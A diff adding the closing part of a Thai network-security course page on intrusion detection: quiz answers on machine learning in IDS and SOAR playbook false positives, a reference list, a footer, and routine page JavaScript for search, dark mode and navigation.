+    <p><strong>เฉลย:</strong> <strong>บทบาท AI/ML:</strong> (1) <strong>Supervised Learning (Random Forest, XGBoost):</strong> แยกประเภท Traffic ว่า Normal หรือ Attack (2) <strong>Unsupervised Learning (K-Means, Autoencoder):</strong> ตรวจจับ Anomaly โดยไม่ต้องมี Label Data (3) <strong>Deep Learning (CNN, LSTM):</strong> วิเคราะห์ Network Flow เป็น Sequence ตรวจจับ Pattern ที่ซับซ้อน (4) <strong>Reinforcement Learning:</strong> ปรับ Threshold แบบ Adaptive (5) <strong>NLP:</strong> วิเคราะห์ HTTP Payload และ DNS Query <strong>ข้อจำกัด:</strong> (1) <strong>Adversarial ML:</strong> ผู้โจมตีสร้าง Input ที่หลอก Model (2) <strong>Concept Drift:</strong> พฤติกรรมเครือข่ายเปลี่ยน — ต้อง Retrain เป็นระยะ (3) <strong>Explainability (XAI):</strong> ทำไม Model ถึงตัดสินใจแบบนั้น (4) <strong>Resource Intensive:</strong> ต้องใช้ GPU สำหรับ Deep Learning โดยเฉพาะที่ Traffic ระดับ 10Gbps+</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="10">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 10</span>
+    <p>จาก Playbook การตอบสนองอัตโนมัติ (SOAR) สำหรับ Ransomware ในบทนี้ จงวิเคราะห์ว่าหาก Playbook ผิดพลาด (False Positive) จะเกิดผลกระทบอะไรบ้าง และจะออกแบบ Fallback Plan อย่างไร</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> <strong>ผลกระทบจาก False Positive:</strong> (1) <strong>Isolate infected host:</strong> เครื่องผู้ใช้ปกติถูกตัดออกจากเครือข่าย — ไม่สามารถทำงานได้ (2) <strong>Block C2 IP on Firewall:</strong> หาก C2 IP จริงคือ CDN หรือ Cloud Service (เช่น Cloudflare, AWS) จะบล็อกบริการที่ถูกต้อง (3) <strong>Snapshot:</strong> สิ้นเปลือง Storage โดยไม่จำเป็น (4) <strong>Notify IR team:</strong> เสียเวลาและทรัพยากรทีมตอบสนอง <strong>Fallback Plan:</strong> (1) ใช้ Playbook แบบ Semi-automated — ให้ Human-in-the-Loop อนุมัติขั้นตอน Critical ก่อนดำเนินการ (2) มี Rollback Mechanism — คำสั่ง Un-isolate Host, Unblock IP โดยอัตโนมัติหลังจากยืนยันว่าเป็น False Positive (3) กำหนด Timeout — ถ้าไม่มีการตอบสนองจาก Admin ภายใน N นาที ให้ยกเลิก Playbook (4) ใช้ Sandboxing — ย้าย Host ไปเครือข่ายกักกัน (Quarantine VLAN) แทนการตัดขาดทันที (5) มี Monitoring สำหรับ Playbook Execution — ถ้าพบความผิดปกติให้หยุดและแจ้ง Admin ทันที</p>
+  </div>
+</div>
+</section>
+<hr>
+
+<section id="references" class="section-ref">
+<h2><i class="fas fa-book" aria-hidden="true"></i> เอกสารอ้างอิง (References)</h2>
+<ol>
+  <li>Stallings, W. (2022). <em>Cryptography and Network Security: Principles and Practice</em> (8th ed.). Chapter 21: Intrusion Detection. Pearson.</li>
+  <li>Whitman, M. E., &amp; Mattord, H. J. (2021). <em>Principles of Information Security</em> (7th ed.). Chapter 7: Intrusion Detection and Prevention Systems. Cengage Learning.</li>
+  <li>Snort Project. (2024). <em>Snort User Manual</em>. Retrieved from https://www.snort.org/documents</li>
+  <li>Suricata Project. (2024). <em>Suricata User Guide</em>. Open Information Security Foundation. Retrieved from https://suricata.readthedocs.io/</li>
+  <li>Zeek Project. (2024). <em>Zeek User Manual</em>. Retrieved from https://docs.zeek.org/</li>
+  <li>Paxson, V. (1999). "Bro: A System for Detecting Network Intruders in Real-Time." <em>Proceedings of the 7th USENIX Security Symposium</em>.</li>
+  <li>NIST Special Publication 800-94 Rev. 1. (2024). <em>Guide to Intrusion Detection and Prevention Systems (IDPS)</em>. National Institute of Standards and Technology.</li>
+  <li>Sommer, R., &amp; Paxson, V. (2010). "Outside the Closed World: On Using Machine Learning for Network Intrusion Detection." <em>IEEE Symposium on Security and Privacy</em>.</li>
+  <li>MITRE Corporation. (2024). <em>MITRE ATT&CK Framework — Detection</em>. Retrieved from https://attack.mitre.org/</li>
+  <li>Cisco Talos Intelligence Group. (2024). <em>Snort Rule Documentation</em>. Retrieved from https://talosintelligence.com/</li>
+</ol>
+</section>
+</main>
+</div> <!-- .layout -->
+
+<footer class="site-footer" role="contentinfo">
+  <hr class="footer-divider">
+  <p><i class="fas fa-shield-halved" aria-hidden="true"></i> รายวิชา Network Security | ภาคเรียนที่ 1 ปีการศึกษา 2569</p>
+  <p style="margin-top:0.5rem;font-size:0.8rem;">เอกสารนี้เป็นส่วนหนึ่งของรายวิชา Network Security | ภาคเรียนที่ 1 ปีการศึกษา 2569</p>
+</footer>
+
+<button id="back-to-top" aria-label="กลับไปด้านบน" title="กลับไปด้านบน">
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</button>
+
+<script>
+// ====== Loading Screen ======
+window.addEventListener('load', function() {
+  document.getElementById('loading-screen').classList.add('hidden');
+});
+
+// ====== Progress Bar ======
+window.addEventListener('scroll', function() {
+  var scrollTop = window.scrollY;
+  var docHeight = document.documentElement.scrollHeight - window.innerHeight;
+  var progress = docHeight > 0 ? (scrollTop / docHeight) * 100 : 0;
+  document.getElementById('progress-bar').style.width = progress + '%';
+  document.getElementById('progress-bar').setAttribute('aria-valuenow', Math.round(progress));
+});
+
+// ====== Dark Mode ======
+(function() {
+  var toggle = document.getElementById('dark-mode-toggle');
+  var icon = toggle.querySelector('i');
+  var theme = localStorage.getItem('theme');
+  if (theme === 'dark') {
+    document.documentElement.setAttribute('data-theme', 'dark');
+    icon.className = 'fas fa-sun';
+  }
+  toggle.addEventListener('click', function() {
+    var current = document.documentElement.getAttribute('data-theme');
+    if (current === 'dark') {
+      document.documentElement.removeAttribute('data-theme');
+      localStorage.setItem('theme', 'light');
+      icon.className = 'fas fa-moon';
+    } else {
+      document.documentElement.setAttribute('data-theme', 'dark');
+      localStorage.setItem('theme', 'dark');
+      icon.className = 'fas fa-sun';
+    }
+  });
+})();
+
+// ====== Sidebar Toggle (mobile) ======
+(function() {
+  var btn = document.getElementById('sidebar-toggle');
+  var sidebar = document.getElementById('sidebar');
+  var overlay = document.getElementById('sidebar-overlay');
+  if (!btn || !sidebar || !overlay) return;
+  btn.addEventListener('click', function() {
+    var open = sidebar.classList.toggle('open');
+    overlay.classList.toggle('active');
+    btn.setAttribute('aria-expanded', open);
+  });
+  overlay.addEventListener('click', function() {
+    sidebar.classList.remove('open');
+    overlay.classList.remove('active');
+    btn.setAttribute('aria-expanded', 'false');
+  });
+})();
+
+// ====== Scroll Spy ======
+(function() {
+  var tocLinks = document.querySelectorAll('.toc-link');
+  var sections = [];
+  tocLinks.forEach(function(link) {
+    var targetId = link.getAttribute('data-target');
+    var el = document.getElementById(targetId);
+    if (el) sections.push({ id: targetId, el: el, link: link });
+  });
+  
+  function updateActive() {
+    var scrollPos = window.scrollY + 120;
+    var currentId = null;
+    for (var i = 0; i < sections.length; i++) {
+      var s = sections[i];
+      if (s.el.offsetTop <= scrollPos) {
+        currentId = s.id;
+      }
+    }
+    tocLinks.forEach(function(l) { l.classList.remove('active'); });
+    if (currentId) {
+      var activeLink = document.querySelector('.toc-link[data-target="' + currentId + '"]');
+      if (activeLink) {
+        activeLink.classList.add('active');
+        var sidebar = document.getElementById('sidebar');
+        if (sidebar) {
+          var itemTop = activeLink.offsetTop - sidebar.offsetTop;
+          var itemBottom = itemTop + activeLink.offsetHeight;
+          var sidebarScrollTop = sidebar.scrollTop;
+          var sidebarHeight = sidebar.clientHeight;
+          if (itemTop < sidebarScrollTop) {
+            activeLink.scrollIntoView({ block: 'nearest' });
+          } else if (itemBottom > sidebarScrollTop + sidebarHeight) {
+            activeLink.scrollIntoView({ block: 'nearest' });
+          }
+        }
+      }
+    }
+  }
+  
+  window.addEventListener('scroll', updateActive);
+  window.addEventListener('load', updateActive);
+  setTimeout(updateActive, 500);
+})();
+
+// ====== Smooth scroll for TOC links ======
+document.querySelectorAll('.toc-link').forEach(function(link) {
+  link.addEventListener('click', function(e) {
+    e.preventDefault();
+    var targetId = this.getAttribute('data-target');
+    var target = document.getElementById(targetId);
+    if (target) {
+      var offset = 80;
+      var targetPos = target.getBoundingClientRect().top + window.scrollY - offset;
+      window.scrollTo({ top: targetPos, behavior: 'smooth' });
+    }
+    var sidebar = document.getElementById('sidebar');
+    var overlay = document.getElementById('sidebar-overlay');
+    if (sidebar && sidebar.classList.contains('open')) {
+      sidebar.classList.remove('open');
+      overlay.classList.remove('active');
+      document.getElementById('sidebar-toggle').setAttribute('aria-expanded', 'false');
+    }
+  });
+});
+
+// ====== Back to Top ======
+(function() {
+  var btn = document.getElementById('back-to-top');
+  window.addEventListener('scroll', function() {
+    if (window.scrollY > 400) {
+      btn.classList.add('visible');
+    } else {
+      btn.classList.remove('visible');
+    }
+  });
+  btn.addEventListener('click', function() {
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  });
+})();
+
+// ====== Copy Code ======
+function copyCode(btn) {
+  var pre = btn.closest('pre');
+  var code = pre.textContent;
+  code = code.replace(/คัดลอก/g, '').trim();
+  navigator.clipboard.writeText(code).then(function() {
+    btn.innerHTML = '<i class="fas fa-check" aria-hidden="true"></i> คัดลอกแล้ว';
+    btn.classList.add('copied');
+    setTimeout(function() {
+      btn.innerHTML = '<i class="fas fa-copy" aria-hidden="true"></i> คัดลอก';
+      btn.classList.remove('copied');
+    }, 2000);
+  }).catch(function() {
+    var textarea = document.createElement('textarea');
+    textarea.value = code;
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand('copy');
+    document.body.removeChild(textarea);
+    btn.innerHTML = '<i class="fas fa-check" aria-hidden="true"></i> คัดลอกแล้ว';
+    btn.classList.add('copied');
+    setTimeout(function() {
+      btn.innerHTML = '<i class="fas fa-copy" aria-hidden="true"></i> คัดลอก';
+      btn.classList.remove('copied');
+    }, 2000);
+  });
+}
+
+// ====== Expandable Sections ======
+function toggleExpand(header) {
+  var expandable = header.closest('.expandable');
+  if (!expandable) return;
+  var isExpanded = expandable.classList.toggle('expanded');
+  header.setAttribute('aria-expanded', isExpanded);
+}
+
+// ====== Reveal Answer (Quiz) ======
+function revealAnswer(btn) {
+  var card = btn.closest('.quiz-card');
+  if (!card) return;
+  card.classList.add('revealed');
+  var answer = card.querySelector('.quiz-answer');
+  if (answer) {
+    answer.classList.remove('hidden');
+  }
+  btn.textContent = 'ดูเฉลยแล้ว';
+  btn.disabled = true;
+}
+
+// ====== Search ======
+(function() {
+  var searchToggle = document.getElementById('search-toggle-btn');
+  var searchOverlay = document.getElementById('search-overlay');
+  var searchInput = document.getElementById('search-input');
+  var searchResults = document.getElementById('search-results');
+  var searchCount = document.getElementById('search-count');
+  var searchClose = document.getElementById('search-close-btn');
+  
+  var mainContent = document.getElementById('main-content');
+  var searchData = [];
+  
+  function buildSearchIndex() {
+    searchData = [];
+    var sections = mainContent.querySelectorAll('h2, h3, h4, p, li, td, th, pre');
+    sections.forEach(function(el) {
+      var text = el.textContent.trim();
+      if (text.length > 10) {
+        var heading = '';
+        var parent = el.parentElement;
+        while (parent && parent !== mainContent) {
+          var prevHeading = parent.querySelector('h2, h3, h4');
+          if (prevHeading) { heading = prevHeading.textContent.trim(); break; }
+          parent = parent.parentElement;
+        }
+        searchData.push({
+          text: text,
+          heading: heading || 'เนื้อหา',
+          element: el
+        });
+      }
+    });
+  }
+  
+  buildSearchIndex();
+  
+  function performSearch(query) {
+    if (!query || query.length < 2) {
+      searchResults.innerHTML = '<div class="no-results">กรุณาป้อนคำค้นหาอย่างน้อย 2 ตัวอักษร</div>';
+      searchCount.textContent = '';
+      return;
+    }
+    
+    var q = query.toLowerCase();
+    var results = [];
+    var totalMatches = 0;
+    
+    searchData.forEach(function(item) {
+      var lower = item.text.toLowerCase();
+      var idx = lower.indexOf(q);
+      if (idx !== -1) {
+        var count = 0;
+        var pos = -1;
+        while ((pos = lower.indexOf(q, pos + 1)) !== -1) count++;
+        totalMatches += count;
+        
+        var snippet = item.text.substring(Math.max(0, idx - 60), idx + q.length + 120);
+        if (idx > 60) snippet = '...' + snippet;
+        if (idx + q.length + 120 < item.text.length) snippet = snippet + '...';
+        
+        snippet = snippet.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        snippet = snippet.replace(new RegExp('(' + q.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'gi'), '<mark>$1</mark>');
+        
+        results.push({
+          heading: item.heading,
+          snippet: snippet,
+          element: item.element,
+          count: count
+        });
+      }
+    });
+    
+    if (results.length > 50) results = results.slice(0, 50);
+    
+    searchCount.textContent = totalMatches + ' ผลลัพธ์';
+    
+    if (results.length === 0) {
+      searchResults.innerHTML = '<div class="no-results">ไม่พบผลลัพธ์สำหรับ "' + query + '"</div>';
+      return;
+    }
+    
+    var html = '';
+    results.forEach(function(r) {
+      html += '<div class="search-result-item" data-heading="' + r.heading.replace(/"/g, '&quot;') + '">';
+      html += '<div class="result-heading">' + r.heading + '</div>';
+      html += '<div class="result-snippet">' + r.snippet + '</div>';
+      html += '</div>';
+    });
+    searchResults.innerHTML = html;
+    
+    searchResults.querySelectorAll('.search-result-item').forEach(function(item, i) {
+      item.addEventListener('click', function() {
+        var el = results[i].element;
+        if (el) {
+          var offset = 100;
+          var pos = el.getBoundingClientRect().top + window.scrollY - offset;
+          window.scrollTo({ top: pos, behavior: 'smooth' });
+          searchOverlay.classList.remove('active');
+          el.style.transition = 'background 0.5s ease';
+          el.style.background = 'var(--bg-tertiary)';
+          setTimeout(function() {
+            el.style.background = '';
+          }, 1500);
+        }
+      });
+    });
+  }
+  
+  var searchTimeout = null;
+  searchInput.addEventListener('input', function() {
+    clearTimeout(searchTimeout);
+    searchTimeout = setTimeout(function() {
+      performSearch(searchInput.value);
+    }, 300);
+  });
+  
+  searchToggle.addEventListener('click', function() {
+    searchOverlay.classList.add('active');
+    setTimeout(function() { searchInput.focus(); }, 100);
+  });
+  
+  searchClose.addEventListener('click', function() {
+    searchOverlay.classList.remove('active');
+    searchInput.value = '';
+    searchResults.innerHTML = '';
+    searchCount.textContent = '';
+  });
+  
+  searchOverlay.addEventListener('click', function(e) {
+    if (e.target === searchOverlay) {
+      searchOverlay.classList.remove('active');
+      searchInput.value = '';
+      searchResults.innerHTML = '';
+      searchCount.textContent = '';
+    }
+  });
+  
+  document.addEventListener('keydown', function(e) {
+    if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+      e.preventDefault();
+      searchToggle.click();
+    }
+    if (e.key === 'Escape') {
+      searchOverlay.classList.remove('active');
+    }
+  });
+})();
+
+document.addEventListener('DOMContentLoaded', function() {
+  document.querySelectorAll('.expandable.expanded').forEach(function(el) {
+    var header = el.querySelector('.expandable-header');
+    if (header) header.setAttribute('aria-expanded', 'true');
+  });
+});
+</script>
+</body>
+</html>
